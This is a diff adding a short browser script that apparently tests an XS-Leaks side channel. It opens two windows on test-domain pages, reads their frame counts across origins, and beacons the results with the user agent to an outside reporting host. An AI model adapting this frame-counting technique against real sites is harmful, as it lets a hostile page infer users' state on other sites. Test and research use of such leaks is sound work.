@@ -1,0 +1,32 @@
+<script>
+    // Get a reference to the window
+    var win1 = window.open('https://leak.test/custom/case2/eight');
+    var eight = -1; // Wait for the page to load
+
+    setTimeout(function () {
+        // Read the number of iframes loaded
+        eight = win1.length;
+        console.log("%d iframes detected", eight);
+    }, 2000);
+    var win2 = window.open('https://leak.test/custom/case2/sixteen');
+    var sixteen = -1; // Wait for the page to load
+
+    setTimeout(function () {
+        // Read the number of iframes loaded
+        sixteen = win2.length;
+        console.log("%d iframes detected", sixteen);
+    }, 2000);
+
+    function report() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://re.port/case3.json/" + btoa(JSON.stringify({
+            "user-agent": navigator.userAgent,
+            "eight": eight,
+            "sixteen": sixteen,
+            "xsleak_reproduced": eight === 8 && sixteen === 16
+        })));
+        xhr.send();
+    }
+    setTimeout(report, 3000);
+
+</script>
